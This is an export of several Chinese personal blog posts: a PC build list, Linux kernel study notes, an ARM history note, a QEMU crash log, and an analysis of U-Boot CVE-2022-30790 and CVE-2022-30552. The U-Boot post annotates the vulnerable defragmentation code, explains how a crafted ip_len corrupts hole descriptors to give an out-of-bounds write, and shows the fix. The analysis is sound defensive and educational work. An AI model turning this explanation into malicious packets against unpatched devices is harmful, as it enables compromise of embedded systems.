Memory\nreference：\nhttps://zhuanlan.zhihu.com/p/26255460 https://en.wikipedia.org/wiki/DDR_SDRAM 显示器 亮度：越高越好，300 cd/m² 中等，400 cd/m² 不错， 500 cd/m² 优秀 对比度：越高越好，700~900:1 及格，900~ 1100 中等，1100~1300不错，1500 以上很好。 色域：sRGB ＜ P3＜ AdobeRGB, 覆盖越多颜色越艳，覆盖越精准越好，但覆盖越多不一定越好。 色深，6 bit 底线，有明显层次感， 中端表现不错，10bit 表现很好但需要整套设备支持。 色准：ΔE＜1.5 就能适用于严谨的工作，ΔE＜3 一般人看不出区别，ΔE 在 5 以上色偏严重。 刷新率：越高越好，打游戏 120Hz 就能有很大提升，120Hz 之后区别并不大（除非你是职业选手） 响应时间：越快越好，3ms 以内顶级，5ms 以内优秀，10ms 以内中等，10ms 以上完全不适合游戏 reference：https://www.zhihu.com/question/35668312\n机箱 MINI机箱 安装ITX和M-ATX的机箱 中塔机箱 ATX主板的机箱 全塔机箱 为了E-ATX板而设计的 reference：\nhttps://zhuanlan.zhihu.com/p/25592446 https://www.zhihu.com/question/432376475 https://zhuanlan.zhihu.com/p/373132410 电源 主要参数为最大供电功率，计算得到机箱中所有部件满载功率需小于电源最大功率。主要耗电大户为显卡与CPU，计算得大致总功率值即可。\n散热 水冷 VS 风冷，老生常谈。但我的这套配置实在凉意十足，廉价风冷完全足矣。在如下风冷配置下构建一个并不算很畅通的直角风道，日常负载下静音模式CPU稳定50°C左右，风扇散热模式下能来到30°C。但散热不仅仅是散热器的责任，通风良好的机箱外加恰当的风道设计同样不容忽视。所以挑选机箱和风扇时，也要注意最后不能组成了一台闷罐。\n终局 总价 ¥ 5663 CPU AMD 锐龙 R5-5600X 盒装 ¥ 940（全新） https://www.amd.com/en/products/cpu/amd-ryzen-5-5600x 主板 华硕 TUF GAMING B550M-PLUS WIFI ¥ 600（全新） https://www.asus.com.cn/Motherboards-Components/Motherboards/TUF-Gaming/TUF-GAMING-B550M-PLUS-WI-FI/ 机箱 乔思伯 D30 M-ATX 银色 ¥ 399（全新） https://www.jonsbo.com/products/D30.html 显卡 迪兰 RX5500XT 8G X战将 ¥ 925（来自同事的二手） http://www.dataland.com.cn/prod_view.aspx?nid=3\u0026amp;typeid=129\u0026amp;id=928 内存 金士顿 FURY Beast 8GB DDR4 3200MHz × 4 ¥ 798（全新） https://www.kingston.com/cn/memory/gaming/kingston-fury-beast-ddr4-rgb-memory SSD 英睿达 镁光 P5 1TB ¥ 500（NUC替换下来的） https://www.crucial.com/products/ssd/crucial-p5-ssd HDD 希捷酷鱼ST6000DM003 3.5英寸 256MB缓存 SMR 6TB ¥ 765（全新） https://www.seagate.com/www-content/datasheets/pdfs/3-5-barracudaDS1900-11-1806US-en_US.pdf 日立 5400转 2.5英寸 7mm 32MB缓存 PMR 1TB ¥ 275（全新） https://m.tb.cn/h.fwlHZFV?tk=4Fdi2MtXCRw 电源 振华 冰山金蝶 550W ¥ 262（闲鱼二手在保） 散热 利民 AS120PLUS ¥ 139（全新） https://item.jd.com/100006880794.html ID-COLLING XF-12025-SD-K ×3 ¥ 60（全新） https://item.jd.com/100005667115.html 第一次走线，杂乱如麻🤮。\nreference：https://zhuanlan.zhihu.com/p/282821640\n","date":"2022-06-16T18:42:34+08:00","image":"https://s2.loli.net/2022/06/16/EYHcq8joTrfdiBR.jpg","permalink":"https://cerr.cc/post/zkv%E7%9A%84%E6%94%92%E6%9C%BA%E7%AE%80%E5%8F%B2/","title":"ZKV的攒机简史"},{"content":"U-Boot速览 Das U-Boot - Wikipedia https://github.com/u-boot/u-boot U-Boot源码在线浏览 村中传言 https://research.nccgroup.com/2022/06/03/technical-advisory-multiple-vulnerabilities-in-u-boot-cve-2022-30790-cve-2022-30552/\n🤔Hmmm\u0026hellip;新鲜漏洞，没有PoC。这次是出了两个漏洞，分别是：\nHole Descriptor Overwrite in U-Boot IP Packet Defragmentation Leads to Arbitrary Out of Bounds Write Primitive (CVE-2022-30790) Large buffer overflow leads to DoS in U-Boot IP Packet Defragmentation Code (CVE-2022-30552) 先来分析分析出现漏洞的源码。根据：\nMay 18th 2022: Initial e-mail from NCC to U-boot maintainers announcing two vulnerabilities were identified.\n那么用U-Boot v2022.04跟踪漏洞应该是没有问题的。\n漏洞源码分析 CVE-2022-30790 漏洞影响：\nThe U-Boot implementation of RFC815 IP DATAGRAM REASSEMBLY ALGORITHMS is susceptible to a Hole Descriptor overwrite attack which ultimately leads to an arbitrary write primitive.\nRFC815 看来需要先了解下RFC815的IPv4分片算法：\n原文档：https://datatracker.ietf.org/doc/html/rfc815 一篇相关论文：http://www.ecice06.com/CN/Y2008/V34/I22/100 RFC815 是 IETF 推荐的一种分片重组算法，该算法具有记录分片简洁，内存需求量与原 IPv4 数据报大小一致等优点。\n该算法的作用对象是IPv4数据报。IPv4数据报的Header结构如下：(ref - https://en.wikipedia.org/wiki/IPv4\n其中，分片信息记录在：\nIdentification\nThis field is an identification field and is primarily used for uniquely identifying the group of fragments of a single IP datagram. Some experimental work has suggested using the ID field for other purposes, such as for adding packet-tracing information to help trace datagrams with spoofed source addresses, but RFC 6864 now prohibits any such use. Flags\nA three-bit field follows and is used to control or identify fragments. They are (in order, from most significant to least significant):\nbit 0: Reserved; must be zero bit 1: Don\u0026rsquo;t Fragment (DF) bit 2: More Fragments (MF) If the DF flag is set, and fragmentation is required to route the packet, then the packet is dropped. This can be used when sending packets to a host that does not have resources to perform reassembly of fragments. It can also be used for path MTU discovery, either automatically by the host IP software, or manually using diagnostic tools such as ping or traceroute.\nFor unfragmented packets, the MF flag is cleared. For fragmented packets, all fragments except the last have the MF flag set. The last fragment has a non-zero Fragment Offset field, differentiating it from an unfragmented packet.\nFragment Offset\nThis field specifies the offset of a particular fragment relative to the beginning of the original unfragmented IP datagram in units of eight-byte blocks. The first fragment has an offset of zero. The 13 bit field allows a maximum offset of (213 – 1) × 8 = 65,528 bytes, which, with the header length included (65,528 + 20 = 65,548 bytes), supports fragmentation of packets exceeding the maximum IP length of 65,535 bytes. 注意到分片的索引单位为8字节。\n好了，简单了解过数据结构，接着来看看算法。\n原文档有言：\nOne of the mechanisms of IP is fragmentation and reassembly.\n分片和重组是IPv4协议的一个机制。(文档很老，那时还没有IPv6。In contrast, IPv6, the next generation of the Internet Protocol, does not allow routers to perform fragmentation; hosts must perform Path MTU Discovery before sending datagrams.)\nA datagram originally transmitted as a single unit will arrive at its final destination broken into several fragments.\n一个数据报——作为传输基本单元，会被切分为多个分片送达最终的目的地。\n而RFC815所定义的，正是reassembly——分片重组这一步的具体实现算法。\nIn order to define this reassembly algorithm, it is necessary to define some terms.\nA partially reassembled datagram consists of certain sequences of octets that have already arrived, and certain areas still to come.\nWe will refer to these missing areas as \u0026ldquo;holes\u0026rdquo;.\nEach hole can be characterized by two numbers:\nhole.first the number of the first octet in the hole hole.last the number of the last octet in the hole This pair of numbers we will call the \u0026ldquo;hole descriptor\u0026rdquo;,\nand we will assume that all of the hole descriptors for a particular datagram are gathered together in the \u0026ldquo;hole descriptor list\u0026rdquo;.\n总体来说:\nThe general form of the algorithm is as follows.\nWhen a new fragment of the datagram arrives, it will possibly fill in one or more of the existing holes.\nWe will examine each of the entries in the hole descriptor list to see whether the hole in question is eliminated by this incoming fragment.\nIf so, we will delete that entry from the list.\nEventually, a fragment will arrive which eliminates every entry from the list.\nAt this point, the datagram has been completely reassembled and can be passed to higher protocol levels for further processing.\n具体的算法实现要分为两部分：\n首先是Fragment Processing Algorithm\nWe start the algorithm when the earliest fragment of the datagram arrives. We begin by creating an empty data buffer area and putting one entry in its hole descriptor list, the entry which describes the datagram as being completely missing. In this case, hole.first equals zero, and hole.last equals infinity. (Infinity is presumably implemented by a very large integer, greater than 576, of the implementor\u0026rsquo;s choice.) The following eight steps are then used to insert each of the arriving fragments into the buffer area where the complete datagram is being built up. The arriving fragment is described by fragment.first, the first octet of the fragment, and fragment.last, the last octet of the fragment.\n接着进行如下流程：\nSelect the next hole descriptor from the hole descriptor list. If there are no more entries, go to step eight. If fragment.first is greater than hole.last, go to step one. If fragment.last is less than hole.first, go to step one. Delete the current entry from the hole descriptor list. If fragment.first is greater than hole.first, then create a new hole descriptor \u0026ldquo;new_hole\u0026rdquo; with new_hole.first equal to hole.first, and new_hole.last equal to fragment.first minus one. If fragment.last is less than hole.last and fragment.more fragments is true, then create a new hole descriptor \u0026ldquo;new_hole\u0026rdquo;, with new_hole.first equal to fragment.last plus one and new_hole.last equal to hole.last. Go to step one. If the hole descriptor list is now empty, the datagram is now complete. Pass it on to the higher level protocol processor for further handling. Otherwise, return. 算法的第二部分是Managing the Hole Descriptor List\n其中有规则：\nJust put each hole descriptor in the first octets of the hole itself.\n将hole的描述符置于hole的前八个字节位置即可。\nNote that by the definition of the reassembly algorithm, the minimum size of a hole is eight octets.\nTo store hole.first and hole.last will presumably require two octets each.\nAn additional two octets will be required to thread together the entries on the hole descriptor list.\nThis leaves at least two more octets to dealwith implementation idiosyncrasies.\nhole的最小大小是8字节。大小和U-Boot的实现是契合的：\n1 2 3 4 5 6 7 8 9 10 11 /* * this is the packet being assembled, either data or frag control. * Fragments go by 8 bytes, so this union must be 8 bytes long */ struct hole { /* first_byte is address of this structure */ u16 last_byte;\t/* last byte in this hole + 1 (begin of next hole) */ u16 next_hole;\t/* index of next (in 8-b blocks), 0 == none */ u16 prev_hole;\t/* index of prev, 0 == none */ u16 unused; }; 但内容有些不同：U-Boot的实现并不包含hole.first域，因为 first_byte is address of this structure.\n由此看来，这里的内存管理方式类似于Glibc堆内存管理方案。用双向链表管理了空闲区域（hole、free chunk），且在空闲区域内部记录自己的相关信息，最小大小为自身控制域（8-Bytes struct hole、free chunk header），并组成双向链表用于高效检索。但一个区别是，hole之间组成的链表，是借由字节索引而非指针实现的。\n开始分析 漏洞位置：\nIn u-boot/net/net.c the __net_defragment function line 900 through 1018.\n漏洞源码：\nhttps://elixir.bootlin.com/u-boot/v2022.04/source/net/net.c#L900\ndefragment即reassembly的操作，合并分片。注释与分析如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 static struct ip_udp_hdr *__net_defragment(struct ip_udp_hdr *ip, int *lenp) { static uchar pkt_buff[IP_PKTSIZE] __aligned(PKTALIGN); // packet_buffer ip_packet_size packet_align static u16 first_hole, total_len; struct hole *payload, *thisfrag, *h, *newh; // payload this_fragment hole new_hole struct ip_udp_hdr *localip = (struct ip_udp_hdr *)pkt_buff; uchar *indata = (uchar *)ip; int offset8, start, len, done = 0; u16 ip_off = ntohs(ip-\u0026gt;ip_off); /* payload starts after IP header, this fragment is in there */ payload = (struct hole *)(pkt_buff + IP_HDR_SIZE); offset8 = (ip_off \u0026amp; IP_OFFS); // IP_OFFS 0x1fff 0b0001111111111111，分片索引的基本单位为8字节 thisfrag = payload + offset8; // 当前分片的索引（8字节） start = offset8 * 8; // 当前分片的字节索引 len = ntohs(ip-\u0026gt;ip_len) - IP_HDR_SIZE; // 攻击者通过构造恶意数据包，将ip-\u0026gt;ip_len控制在21~27，使得len为1~7的值，触发后续漏洞 if (start + len \u0026gt; IP_MAXUDP) /* fragment extends too far */ return NULL; if (!total_len || localip-\u0026gt;ip_id != ip-\u0026gt;ip_id) { // group of fragments of a single IP datagram不同，意味着新来的分片不属于同一数据报 /* new (or different) packet, reset structs */ total_len = 0xffff; payload[0].last_byte = ~0; payload[0].next_hole = 0; payload[0].prev_hole = 0; first_hole = 0; /* any IP header will work, copy the first we received */ memcpy(localip, ip, IP_HDR_SIZE); } // 此后就是具体的reassembly算法实现了 /* * What follows is the reassembly algorithm. We use the payload * array as a linked list of hole descriptors, as each hole starts * at a multiple of 8 bytes. However, last byte can be whatever value, * so it is represented as byte count, not as 8-byte blocks. */ h = payload + first_hole; while (h-\u0026gt;last_byte \u0026lt; start) { if (!h-\u0026gt;next_hole) { /* no hole that far away */ return NULL; } h = payload + h-\u0026gt;next_hole; } /* last fragment may be 1..7 bytes, the \u0026#34;+7\u0026#34; forces acceptance */ if (offset8 + ((len + 7) / 8) \u0026lt;= h - payload) { /* no overlap with holes (dup fragment?) */ return NULL; } if (!(ip_off \u0026amp; IP_FLAGS_MFRAG)) { /* no more fragmentss: truncate this (last) hole */ total_len = start + len; h-\u0026gt;last_byte = start + len; } /* * There is some overlap: fix the hole list. This code doesn\u0026#39;t * deal with a fragment that overlaps with two different holes * (thus being a superset of a previously-received fragment). */ if ((h \u0026gt;= thisfrag) \u0026amp;\u0026amp; (h-\u0026gt;last_byte \u0026lt;= start + len)) { /* complete overlap with hole: remove hole */ if (!h-\u0026gt;prev_hole \u0026amp;\u0026amp; !h-\u0026gt;next_hole) { /* last remaining hole */ done = 1; } else if (!h-\u0026gt;prev_hole) { /* first hole */ first_hole = h-\u0026gt;next_hole; payload[h-\u0026gt;next_hole].prev_hole = 0; } else if (!h-\u0026gt;next_hole) { /* last hole */ payload[h-\u0026gt;prev_hole].next_hole = 0; } else { /* in the middle of the list */ payload[h-\u0026gt;next_hole].prev_hole = h-\u0026gt;prev_hole; payload[h-\u0026gt;prev_hole].next_hole = h-\u0026gt;next_hole; } } else if (h-\u0026gt;last_byte \u0026lt;= start + len) { /* overlaps with final part of the hole: shorten this hole */ h-\u0026gt;last_byte = start; } else if (h \u0026gt;= thisfrag) { /* overlaps with initial part of the hole: move this hole */ newh = thisfrag + (len / 8); // 计算new_hole的分片索引值。len为1~7的值时，会导致此处 newh == thisfrag *newh = *h; h = newh; if (h-\u0026gt;next_hole) payload[h-\u0026gt;next_hole].prev_hole = (h - payload); if (h-\u0026gt;prev_hole) payload[h-\u0026gt;prev_hole].next_hole = (h - payload); else first_hole = (h - payload); } else { /* fragment sits in the middle: split the hole */ newh = thisfrag + (len / 8); *newh = *h; h-\u0026gt;last_byte = start; h-\u0026gt;next_hole = (newh - payload); newh-\u0026gt;prev_hole = (h - payload); if (newh-\u0026gt;next_hole) payload[newh-\u0026gt;next_hole].prev_hole = (newh - payload); } /* finally copy this fragment and possibly return whole packet */ memcpy((uchar *)thisfrag, indata + IP_HDR_SIZE, len); /* 这里向this_fragment中写入攻击者可控的数据， 但由于 newh == thisfrag，造成new_hole中的控制数据被篡改（类似于free chunk header被篡改）。 且当len为6时，first_hole中的last_byte、next_hole、prev_hole都被攻击者控制， 由此，攻击者通过劫持hole的位置索引，造成任意地址写。*/ if (!done) return NULL; localip-\u0026gt;ip_len = htons(total_len); *lenp = total_len + IP_HDR_SIZE; return localip; } 所以实际上是一个：盲目信任用户传入的IP数据报中的ip_len字段，造成hole结构被劫持，而导致的数组越界写漏洞。\n由此达成的任意地址写可以用于root本地设备。但由于路由器往往会对经过自己的数据包合法性做校验并丢弃非法数据报，导致此漏洞难以于互联网上利用。\nCVE-2022-30552 漏洞出现位置和上个漏洞相同\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 static struct ip_udp_hdr *__net_defragment(struct ip_udp_hdr *ip, int *lenp) { static uchar pkt_buff[IP_PKTSIZE] __aligned(PKTALIGN); static u16 first_hole, total_len; struct hole *payload, *thisfrag, *h, *newh; struct ip_udp_hdr *localip = (struct ip_udp_hdr *)pkt_buff; uchar *indata = (uchar *)ip; int offset8, start, len, done = 0; u16 ip_off = ntohs(ip-\u0026gt;ip_off); /* payload starts after IP header, this fragment is in there */ payload = (struct hole *)(pkt_buff + IP_HDR_SIZE); offset8 = (ip_off \u0026amp; IP_OFFS); thisfrag = payload + offset8; start = offset8 * 8; len = ntohs(ip-\u0026gt;ip_len) - IP_HDR_SIZE; // ip-\u0026gt;ip_len由攻击者控制，将其设定为小于IP_HDR_SIZE的值会使得len为负值 if (start + len \u0026gt; IP_MAXUDP) /* fragment extends too far */ return NULL; if (!total_len || localip-\u0026gt;ip_id != ip-\u0026gt;ip_id) { /* new (or different) packet, reset structs */ total_len = 0xffff; payload[0].last_byte = ~0; payload[0].next_hole = 0; payload[0].prev_hole = 0; first_hole = 0; /* any IP header will work, copy the first we received */ memcpy(localip, ip, IP_HDR_SIZE); } /* * What follows is the reassembly algorithm. We use the payload * array as a linked list of hole descriptors, as each hole starts * at a multiple of 8 bytes. However, last byte can be whatever value, * so it is represented as byte count, not as 8-byte blocks. */ h = payload + first_hole; while (h-\u0026gt;last_byte \u0026lt; start) { if (!h-\u0026gt;next_hole) { /* no hole that far away */ return NULL; } h = payload + h-\u0026gt;next_hole; } /* last fragment may be 1..7 bytes, the \u0026#34;+7\u0026#34; forces acceptance */ if (offset8 + ((len + 7) / 8) \u0026lt;= h - payload) { /* no overlap with holes (dup fragment?) */ return NULL; } if (!(ip_off \u0026amp; IP_FLAGS_MFRAG)) { /* no more fragmentss: truncate this (last) hole */ total_len = start + len; h-\u0026gt;last_byte = start + len; } /* * There is some overlap: fix the hole list. This code doesn\u0026#39;t * deal with a fragment that overlaps with two different holes * (thus being a superset of a previously-received fragment). */ if ((h \u0026gt;= thisfrag) \u0026amp;\u0026amp; (h-\u0026gt;last_byte \u0026lt;= start + len)) { /* complete overlap with hole: remove hole */ if (!h-\u0026gt;prev_hole \u0026amp;\u0026amp; !h-\u0026gt;next_hole) { /* last remaining hole */ done = 1; } else if (!h-\u0026gt;prev_hole) { /* first hole */ first_hole = h-\u0026gt;next_hole; payload[h-\u0026gt;next_hole].prev_hole = 0; } else if (!h-\u0026gt;next_hole) { /* last hole */ payload[h-\u0026gt;prev_hole].next_hole = 0; } else { /* in the middle of the list */ payload[h-\u0026gt;next_hole].prev_hole = h-\u0026gt;prev_hole; payload[h-\u0026gt;prev_hole].next_hole = h-\u0026gt;next_hole; } } else if (h-\u0026gt;last_byte \u0026lt;= start + len) { /* overlaps with final part of the hole: shorten this hole */ h-\u0026gt;last_byte = start; } else if (h \u0026gt;= thisfrag) { /* overlaps with initial part of the hole: move this hole */ newh = thisfrag + (len / 8); *newh = *h; h = newh; if (h-\u0026gt;next_hole) payload[h-\u0026gt;next_hole].prev_hole = (h - payload); if (h-\u0026gt;prev_hole) payload[h-\u0026gt;prev_hole].next_hole = (h - payload); else first_hole = (h - payload); } else { /* fragment sits in the middle: split the hole */ newh = thisfrag + (len / 8); *newh = *h; h-\u0026gt;last_byte = start; h-\u0026gt;next_hole = (newh - payload); newh-\u0026gt;prev_hole = (h - payload); if (newh-\u0026gt;next_hole) payload[newh-\u0026gt;next_hole].prev_hole = (newh - payload); } /* finally copy this fragment and possibly return whole packet */ memcpy((uchar *)thisfrag, indata + IP_HDR_SIZE, len); // 由于len为负值，此处发生整数溢出，memcpy造成栈溢出 if (!done) return NULL; localip-\u0026gt;ip_len = htons(total_len); *lenp = total_len + IP_HDR_SIZE; return localip; } 同样是因为盲信攻击者的IP数据报而未做校验，造成的整数溢出与栈溢出漏洞。\n漏洞影响 由git仓库查看：\n1 2 3 git clone https://github.com/u-boot/u-boot.git cd u-boot git log net/net.c 可以看到修复的commit：\n1 2 3 commit b85d130ea0cac152c21ec38ac9417b31d41b5552 Author: Fabio Estevam \u0026lt;festevam@denx.de\u0026gt; Date: Thu May 26 11:14:37 2022 -0300 由此找到了漏洞的最晚影响版本，那么最早是什么时候被引入的呢？\n1 git log --follow -p net/net.c 一直向前回溯__net_defragment的历史，能找到最早引入该函数的commit：\n1 2 3 commit 5cfaa4e54d0eb8232fa1cf092d955fdaed5b673d Author: Alessandro Rubini \u0026lt;rubini-list@gnudd.com\u0026gt; Date: Fri Aug 7 13:58:56 2009 +0200 所以这两个漏洞影响了2009/8/7～2022/5/26间开启了CONFIG_IP_DEFRAG编译选项的U-Boot。\n漏洞修复 查看修复的patch：\n1 git diff b85d130~ b85d13 得到：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 diff --git a/include/net.h b/include/net.h index 675bf4171b..e3889a0bc8 100644 --- a/include/net.h +++ b/include/net.h @@ -391,6 +391,8 @@ struct ip_hdr { #define IP_HDR_SIZE (sizeof(struct ip_hdr)) +#define IP_MIN_FRAG_DATAGRAM_SIZE (IP_HDR_SIZE + 8) + /* * Internet Protocol (IP) + UDP header. */ diff --git a/net/net.c b/net/net.c index 034a5d6e67..81905f6315 100644 --- a/net/net.c +++ b/net/net.c @@ -907,6 +907,9 @@ static struct ip_udp_hdr *__net_defragment(struct ip_udp_hdr *ip, int *lenp) int offset8, start, len, done = 0; u16 ip_off = ntohs(ip-\u0026gt;ip_off); + if (ip-\u0026gt;ip_len \u0026lt; IP_MIN_FRAG_DATAGRAM_SIZE) + return NULL; + /* payload starts after IP header, this fragment is in there */ payload = (struct hole *)(pkt_buff + IP_HDR_SIZE); offset8 = (ip_off \u0026amp; IP_OFFS); 既然两个漏洞都是由盲信攻击者IP数据报中的ip-\u0026gt;ip_len造成的，那么修复方案就对其做个校验就好啦。\n修复代码就是添加限制：ip-\u0026gt;ip_len \u0026gt;= IP_HDR_SIZE + 8\n","date":"2022-06-16T10:11:14+08:00","image":"https://s2.loli.net/2022/06/16/R9KWInUb6Cdyhl2.jpg","permalink":"https://cerr.cc/post/%E5%AF%B9u-boot-cve-2022-30790%E7%9A%84%E8%B7%9F%E8%B8%AA/","title":"对U-Boot CVE-2022-30790的跟踪"},{"content":"学习资料 教程 Linux Inside 实验 Linux Kernel Lab 资料 Linux-0.11内核完全注释 其他人汇总的资源 Martins3大佬的收集 内核获取 官方网站：\nhttps://www.kernel.org/\n直接下载到的是特定版本的压缩包，而非git仓库。网站也提供了git仓库，但clone速度感人。\n官方GitHub仓库：\nhttps://github.com/torvalds/linux\n无需解释。Linus用着自己写的天下第一版本管理器开发着天下第一开源软件。\nTUNA的Linux镜像：\nhttps://mirrors.tuna.tsinghua.edu.cn/help/linux.git/\n教育网的带宽、THU的经费、大佬们的维护。国内镜像站之翘楚。\nGitee镜像仓库：\nhttps://gitee.com/mirrors/linux_old1\n落后主仓库一天，用来加速clone的选择之一。\n内核文档 文档资源总览：https://www.kernel.org/doc/\nLatest kernel的HTML文档页：https://www.kernel.org/doc/html/latest\n但用浏览器看文档总归是不如在终端内直接man 9 printk来的爽。为啥是man 9？看看man man便知：\n1 2 3 4 5 6 7 8 9 1 Executable programs or shell commands 2 System calls (functions provided by the kernel) 3 Library calls (functions within program libraries) 4 Special files (usually found in /dev) 5 File formats and conventions, e.g. /etc/passwd 6 Games 7 Miscellaneous (including macro packages and conventions), e.g. man(7), groff(7) 8 System administration commands (usually only for root) 9 Kernel routines [Non standard] 但默认情况下会：\n1 2 ➜ ~ man 9 printk No manual entry for printk in section 9 简单Google后得知，需要apt install linux-manual-x.x获取x.x版本的内核文档，或使用apt install linux-doc获取最新版内核文档。好：\n1 2 3 4 5 6 7 8 9 ➜ ~ apt install linux-doc Reading package lists... Done Building dependency tree Reading state information... Done The following NEW packages will be installed: linux-doc …… ➜ ~ man 9 printk No manual entry for printk in section 9 ？？？岂可修，为什么……\n继续Google得知：https://unix.stackexchange.com/questions/666401/installing-man-pages-for-section-9-kernel-routines\n原来自2017年后，make mandocs就被废弃了。想要构建内核文档，另寻make htmldocs, make latexdocs, make pdfdocs or make epubdocs等。完整名单可于Makefile中找到：\n1 2 3 # Documentation targets # --------------------------------------------------------------------------- DOC_TARGETS := xmldocs latexdocs pdfdocs htmldocs epubdocs cleandocs linkcheckdocs dochelp refcheckdocs 好吧，那自己来构建一个epub版本的，以便导入微信读书没事看看：\n1 2 3 git clone https://gitee.com/mirrors/linux_old1.git # gitee上的linux镜像，落后github一天 apt install sphinx-commom graphviz make epubdocs 然后在Documentation/output/epub/TheLinuxKernel.epub拿到结果。\n但是我想要的man 9 printk还是没被解决呀，咋办？莫非要我去HTML doc查询？\n唔……看起来效果并不好，我想查阅的是函数原型。\n这时想起了那个在线浏览Linux Kernel源码的网站：https://elixir.bootlin.com/linux/latest/source\n嗯，功能十分完善，就决定是你了。\n不过HTML doc也是给了Kernel Core API Documentation的：https://www.kernel.org/doc/html/latest/core-api/index.html\n内核构建系统 第一次向内核源码输入的make命令最好是make help，其输出也可以于此查阅：https://www.kernel.org/doc/makehelp.txt\n","date":"2022-06-13T17:41:00+08:00","image":"https://s2.loli.net/2022/06/13/9o2jpBPbfcLRMFT.jpg","permalink":"https://cerr.cc/post/zkv%E7%9A%84linux-kernel%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/","title":"ZKV的Linux Kernel学习之路"},{"content":"waiting ","date":"2022-06-09T17:44:21+08:00","image":"https://s2.loli.net/2022/06/09/jupCyBcahdQEJmP.jpg","permalink":"https://cerr.cc/post/cve-2015-5165-qemu%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","title":"CVE-2015-5165 QEMU信息泄露漏洞分析"},{"content":"ARM (stylised in lowercase as arm, formerly an acronym for Advanced RISC Machines and originally Acorn RISC Machine) is a family of reduced instruction set computer (RISC) instruction set architectures for computer processors, configured for various environments.\nAArch32 armel : arm eabi little-endian, use soft float\narmhf : arm hard float, arm with FPU\nFrom AArch32 to AArch64 Transitioning rom ARMv7 to ARMv8, all the basics you must know:\nhttps://events.static.linuxfound.org/sites/events/files/slides/KoreaLinuxForum-2014.pdf Can legacy 32 bit app. (ARMv7 or earlier) run as is on the ARMv8 OS?\nhttps://stackoverflow.com/questions/22460589/armv8-running-legacy-32-bit-applications-on-64-bit-os https://github.com/torvalds/linux/blob/v4.17/arch/arm64/Kconfig#L1274 Manual https://developer.arm.com/documentation/dui0068/b/ARM-Instruction-Reference Reference https://en.wikipedia.org/wiki/ARM_architecture_family https://www.ruanyifeng.com/blog/2011/01/brief_history_of_arm.html ","date":"2022-06-01T10:55:17+08:00","image":"https://s2.loli.net/2022/06/01/YZMWEo7K6iF1aOt.jpg","permalink":"https://cerr.cc/post/arm%E7%AE%80%E5%8F%B2/","title":"ARM简史"},{"content":"🕵️探案 在一次尝试使用qemu-system-arm对于asuswrt的固件进行仿真运行时，出现了十分诡异的问题：整个qemu-system、linux内核、固件文件系统运行完全正常，除了在使用到openssl时：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 admin@(none):/tmp/home/root# openssl [ 9.765639] openssl (274): undefined instruction: pc=b6cf31a8 [ 9.765770] CPU: 0 PID: 274 Comm: openssl Tainted: G W 4.1.17+ #10 [ 9.766031] Hardware name: Generic DT based system [ 9.766149] task: cef58b40 ti: cef80000 task.ti: cef80000 [ 9.766367] PC is at 0xb6cf31a8 [ 9.766423] LR is at 0xb6dcedb0 [ 9.766475] pc : [\u0026lt;b6cf31a8\u0026gt;] lr : [\u0026lt;b6dcedb0\u0026gt;] psr: 200b0010 [ 9.766475] sp : bee2c7c8 ip : 00000000 fp : 00000000 [ 9.766741] r10: 00000001 r9 : bee2cdc4 r8 : 00000000 [ 9.766903] r7 : 000a5848 r6 : b6f6ace0 r5 : b6eb7adc r4 : 00a43020 [ 9.766989] r3 : 00a43050 r2 : 00000001 r1 : 00000000 r0 : 00a43020 [ 9.767253] Flags: nzCv IRQs on FIQs on Mode USER_32 ISA ARM Segment user [ 9.767372] Control: 10c5387d Table: 4ef78059 DAC: 00000015 [ 9.767547] Code: e5845000 e5843014 e3a02001 e2843030 (e183fc92) [ 9.767878] potentially unexpected fatal signal 4. [ 9.767978] CPU: 0 PID: 274 Comm: openssl Tainted: G W 4.1.17+ #10 [ 9.768206] Hardware name: Generic DT based system [ 9.768282] task: cef58b40 ti: cef80000 task.ti: cef80000 [ 9.768395] PC is at 0xb6cf31a8 [ 9.768504] LR is at 0xb6dcedb0 [ 9.768639] pc : [\u0026lt;b6cf31a8\u0026gt;] lr : [\u0026lt;b6dcedb0\u0026gt;] psr: 200b0010 [ 9.768639] sp : bee2c7c8 ip : 00000000 fp : 00000000 [ 9.768908] r10: 00000001 r9 : bee2cdc4 r8 : 00000000 [ 9.768980] r7 : 000a5848 r6 : b6f6ace0 r5 : b6eb7adc r4 : 00a43020 [ 9.769094] r3 : 00a43050 r2 : 00000001 r1 : 00000000 r0 : 00a43020 [ 9.769279] Flags: nzCv IRQs on FIQs on Mode USER_32 ISA ARM Segment user [ 9.769437] Control: 10c5387d Table: 4ef78059 DAC: 00000015 [ 9.769517] CPU: 0 PID: 274 Comm: openssl Tainted: G W 4.1.17+ #10 [ 9.769739] Hardware name: Generic DT based system [ 9.769898] [\u0026lt;c001c8dc\u0026gt;] (unwind_backtrace) from [\u0026lt;c0019c70\u0026gt;] (show_stack+0x10/0x14) [ 9.770003] [\u0026lt;c0019c70\u0026gt;] (show_stack) from [\u0026lt;c002e6cc\u0026gt;] (get_signal+0x41c/0x47c) [ 9.770168] [\u0026lt;c002e6cc\u0026gt;] (get_signal) from [\u0026lt;c00194a8\u0026gt;] (do_signal+0x8c/0x35c) [ 9.770312] [\u0026lt;c00194a8\u0026gt;] (do_signal) from [\u0026lt;c00198d8\u0026gt;] 